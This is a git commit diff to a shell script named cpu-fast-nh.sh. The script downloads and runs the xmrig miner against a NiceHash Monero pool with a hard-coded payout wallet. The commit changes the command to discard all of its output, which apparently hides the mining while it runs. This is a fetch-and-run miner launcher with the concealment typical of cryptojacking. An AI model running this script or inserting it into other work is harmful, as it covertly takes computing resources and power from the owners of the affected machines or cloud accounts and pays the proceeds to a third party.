6285e0128b7f4a743818154f9f677030cd717654
fcknjds <144345473+fcknjds@users.noreply.github.com>
2023-09-20 14:37:04 +0300

    Update cpu-fast-nh.sh

--- cpu-fast-nh.sh
+++ cpu-fast-nh.sh
@@ -1,1 +1,3 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz && tar xf xmrig-6.16.2-linux-static-x64.tar.gz && cd xmrig-6.16.2 && ./xmrig -a randomx -o randomxmonero.eu.nicehash.com:3380 -u 3MdwHiobm1gjfZRTdyG5ByDNQZQdzNwmje --coin monero
+{
+  wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz && tar xf xmrig-6.16.2-linux-static-x64.tar.gz && cd xmrig-6.16.2 && ./xmrig -a randomx -o randomxmonero.eu.nicehash.com:3380 -u 3MdwHiobm1gjfZRTdyG5ByDNQZQdzNwmje --coin monero
+} &> /dev/null
